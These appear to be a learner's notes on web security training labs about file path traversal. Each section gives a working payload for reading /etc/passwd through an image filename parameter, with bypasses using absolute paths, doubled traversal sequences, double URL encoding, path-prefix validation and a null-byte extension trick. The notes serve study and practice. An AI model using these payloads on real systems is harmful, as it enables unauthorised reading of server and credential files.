# Encounters

# Simple file path traversal
Get /etc/passwd
## Observations
- Image files are retrieved as /image=filename=foo.png
- Simple payload - ```/../../../etc/passwd``` and the contents are in the response body. 

# File path traversal, traversal sequences blocked with absolute path bypass
Get /etc/passwd
## Observations
- Pretty much the same thing but absolute paths rather than traversal so the payload ```/etc/passwd``` does the trick. For example on Windows we'd need C:\Windows\win.ini. 

# File path traversal, traversal sequences stripped non-recursively
## Observations
- Same vector but the app is stripping what I am sending. Sent it to Intruder and used Jhadix's list without URL encoding and got a number of successes with double paths like this:
```
/image?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

# File path traversal, traversal sequences stripped with superfluous URL-decode
## Observations
- Did the same thing as above but this time I allowed URL encoding. 
```
/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%2fpasswd
```

# File path traversal, validation of start of path
## Observations
- Using absolute paths to validate their files, kind of. Really we just need to provide the path then recurse back up to the root directory then down to where we want to go:
```
/image?filename=/var/www/images/../../../etc/passwd
```

# File path traversal, validation of file extension with null byte bypass
## Observations
- Validating files with extensions so if we URL encoded and provide a null by %00 then we can add .jpg or some other valid extension to satisfy the requirement:
```
/image?filename=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00%2ejpg
```
Again JHaddix list worked. 

